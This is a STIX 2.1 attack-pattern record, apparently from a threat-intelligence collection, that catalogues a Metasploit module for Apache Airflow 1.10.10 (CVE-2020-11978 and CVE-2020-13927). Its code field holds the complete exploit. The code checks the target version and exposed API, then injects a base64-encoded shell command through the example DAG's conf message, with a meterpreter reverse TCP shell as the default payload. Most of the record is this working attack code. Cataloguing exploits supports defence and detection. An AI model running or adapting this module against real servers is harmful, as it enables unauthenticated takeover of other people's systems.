{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--553ff910-9d86-4a73-bbcf-30a720ca1048",
    "created": "2024-08-14T17:04:30.201352Z",
    "modified": "2024-08-14T17:04:30.201357Z",
    "name": "Apache Airflow 1.10.10 - Example DAG Remote Code Execution",
    "description": " This module exploits an unauthenticated command injection vulnerability by combining two critical vulnerabilities in Apache Airflow 1.10.10.",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/apache_airflow_dag_rce.rb",
            "external_id": "apache_airflow_dag_rce.rb"
        },
        {
            "source_name": "xuxiang",
            "external_id": "#OriginaldiscoveryandCVEsubmission"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-11978"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-13927"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/pberba/CVE-2020-11978/"
        },
        {
            "source_name": "reference",
            "url": "https://lists.apache.org/thread/cn57zwylxsnzjyjztwqxpmly0x9q5ljx"
        },
        {
            "source_name": "reference",
            "url": "https://lists.apache.org/thread/mq1bpqf3ztg1nhyc5qbrjobfrzttwx1d"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Apache Airflow 1.10.10 - Example DAG Remote Code Execution',\n        'Description' => %q{\n          This module exploits an unauthenticated command injection vulnerability\n          by combining two critical vulnerabilities in Apache Airflow 1.10.10.\n          The first, CVE-2020-11978, is an authenticated command injection vulnerability\n          found in one of Airflow's example DAGs, \"example_trigger_target_dag\", which\n          allows any authenticated user to run arbitrary OS commands as the user\n          running Airflow Worker/Scheduler. The second, CVE-2020-13927, is a default\n          setting of Airflow 1.10.10 that allows unauthenticated access to Airflow's\n          Experimental REST API to perform malicious actions such as creating the\n          vulnerable DAG above. The two CVEs taken together allow vulnerable DAG creation\n          and command injection, leading to unauthenticated remote code execution.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'xuxiang',            # Original discovery and CVE submission\n          'Pepe Berba',         # ExploitDB author\n          'Ismail E. Dawoodjee' # Metasploit module author\n        ],\n        'References' => [\n          [ 'EDB', '49927' ],\n          [ 'CVE', '2020-11978' ],\n          [ 'CVE', '2020-13927' ],\n          [ 'URL', 'https://github.com/pberba/CVE-2020-11978/' ],\n          [ 'URL', 'https://lists.apache.org/thread/cn57zwylxsnzjyjztwqxpmly0x9q5ljx' ],\n          [ 'URL', 'https://lists.apache.org/thread/mq1bpqf3ztg1nhyc5qbrjobfrzttwx1d' ],\n        ],\n        'Platform' => ['linux', 'unix'],\n        'Arch' => ARCH_CMD,\n        'Targets' => [\n          [\n            'Unix Command', { 'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/python/meterpreter_reverse_tcp' } }\n          ],\n        ],\n        'Privileged' => false,\n        'DisclosureDate' => '2020-07-14',\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [ARTIFACTS_ON_DISK, IOC_IN_LOGS]\n        }\n      )\n    )\n    register_options(\n      [\n        Opt::RPORT(8080, true, 'Apache Airflow webserver default port'),\n        OptString.new('TARGETURI', [ true, 'Base path', '/' ]),\n        OptString.new('DAG_PATH', [\n          true,\n          'Path to vulnerable example DAG',\n          '/api/experimental/dags/example_trigger_target_dag'\n        ]),\n        OptInt.new('TIMEOUT', [true, 'How long to wait for payload execution (seconds)', 120])\n      ]\n    )\n  end\n\n  def check\n    uri = normalize_uri(target_uri.path, 'admin', 'airflow', 'login')\n    vprint_status(\"Checking target web server for a response at: #{full_uri(uri)}\")\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => uri\n    })\n\n    unless res\n      return CheckCode::Unknown('Target did not respond to check request.')\n    end\n\n    unless res.code == 200 &&\n           res.body.downcase.include?('admin') &&\n           res.body.downcase.include?('_csrf_token') &&\n           res.body.downcase.include?('sign in to airflow')\n      return CheckCode::Unknown('Target is not running Apache Airflow.')\n    end\n\n    vprint_good('Target is running Apache Airflow.')\n\n    vprint_status('Checking Apache Airflow version...')\n    version_number = res.body.to_s.scan(\n      %r{<a href=\"https://airflow[.]apache[.]org/docs/([\\d.]+)\"}\n    ).flatten.first\n\n    unless version_number\n      return CheckCode::Detected('Apache Airflow version cannot be determined.')\n    end\n\n    unless Rex::Version.new(version_number) < Rex::Version.new('1.10.11')\n      return CheckCode::Safe\n    end\n\n    vprint_status(\n      \"Target is running Apache Airflow Version #{version_number}. \" \\\n      'Performing additional checks for exploitability...'\n    )\n\n    check_api\n    check_task\n    check_unpaused\n\n    return CheckCode::Appears\n  end\n\n  def check_api\n    uri = normalize_uri(target_uri.path, 'api', 'experimental', 'test')\n    vprint_status(\"Checking if Airflow Experimental REST API is accessible at: #{full_uri(uri)}\")\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => uri\n    })\n\n    unless res && res.code == 200\n      return CheckCode::Safe('Could not access the Airflow Experimental REST API.')\n    end\n\n    vprint_good('Airflow Experimental REST API is accessible.')\n  end\n\n  def check_task\n    uri = normalize_uri(target_uri.path, datastore['DAG_PATH'], 'tasks', 'bash_task')\n    vprint_status('Checking for vulnerability of \"example_trigger_target_dag.bash_task\"...')\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => uri\n    })\n\n    unless res && res.code == 200\n      return CheckCode::Safe(\n        'Could not find \"example_trigger_target_dag.bash_task\". ' \\\n        'Target is not vulnerable to CVE-2020-11978.'\n      )\n    end\n\n    if res.get_json_document['env'].include?('dag_run')\n      return CheckCode::Safe(\n        'The \"example_trigger_target_dag.bash_task\" is patched. ' \\\n        'Target is not vulnerable to CVE-2020-11978.'\n      )\n    end\n\n    vprint_good('The \"example_trigger_target_dag.bash_task\" is vulnerable.')\n  end\n\n  def check_unpaused\n    uri = normalize_uri(target_uri.path, datastore['DAG_PATH'], 'paused', 'false')\n    vprint_status('Checking if \"example_trigger_target_dag.bash_task\" can be unpaused...')\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => uri\n    })\n\n    unless res && res.code == 200\n      return CheckCode::Safe(\n        'Could not unpause \"example_trigger_target_dag.bash_task\". ' \\\n        'Example DAGs were not loaded.'\n      )\n    end\n\n    vprint_good('The \"example_trigger_target_dag.bash_task\" is unpaused.')\n  end\n\n  def create_dag(cmd)\n    cmd = \"echo #{Base64.strict_encode64(cmd)} | base64 -d | sh\"\n    uri = normalize_uri(target_uri.path, datastore['DAG_PATH'], 'dag_runs')\n    vprint_status('Creating a new vulnerable DAG...')\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => uri,\n      'ctype' => 'application/json',\n      'data' => JSON.generate({ conf: { message: \"\\\"; #{cmd};#\" } })\n    })\n\n    unless res && res.code == 200\n      fail_with(Failure::PayloadFailed, 'Failed to create DAG.')\n    end\n\n    print_good(\"Successfully created DAG: #{res.get_json_document['message']}\")\n    return res.get_json_document['execution_date']\n  end\n\n  def await_execution(execution_date)\n    uri = normalize_uri(\n      target_uri.path,\n      datastore['DAG_PATH'],\n      'dag_runs', execution_date, 'tasks', 'bash_task'\n    )\n    print_status('Waiting for Scheduler to run the vulnerable DAG. This might take a while...')\n    vprint_warning('If the Bash task is never queued, then the Scheduler might not be running.')\n\n    i = 0\n    loop do\n      i += 1\n      sleep(10)\n      res = send_request_cgi({\n        'method' => 'GET',\n        'uri' => uri\n      })\n\n      unless res && res.code == 200\n        fail_with(Failure::Unknown, 'Bash task state cannot be determined.')\n      end\n\n      state = res.get_json_document['state']\n      if state == 'queued'\n        print_status('Bash task is queued...')\n      elsif state == 'running'\n        print_good('Bash task is running. Expect a session if executed successfully.')\n        break\n      elsif state == 'success'\n        print_good('Successfully ran Bash task. Expect a session soon.')\n        break\n      elsif state == 'None'\n        print_warning('Bash task is not yet queued...')\n      elsif state == 'scheduled'\n        print_status('Bash task is scheduled...')\n      else\n        print_status(\"Bash task state: #{state}.\")\n        break\n      end\n      # stop loop when timeout\n      next unless datastore['TIMEOUT'] <= 10 * i\n\n      fail_with(Failure::TimeoutExpired,\n                'Bash task did not run within the specified time ' \\\n                \"- #{datastore['TIMEOUT']} seconds.\")\n    end\n  end\n\n  def exploit\n    print_status(\"Executing TARGET: \\\"#{target.name}\\\" with PAYLOAD: \\\"#{datastore['PAYLOAD']}\\\"\")\n    execution_date = create_dag(payload.encoded)\n    await_execution(execution_date)\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2020-07-14",
    "x_mitre_platforms": [
        "['linux', 'unix']"
    ]
}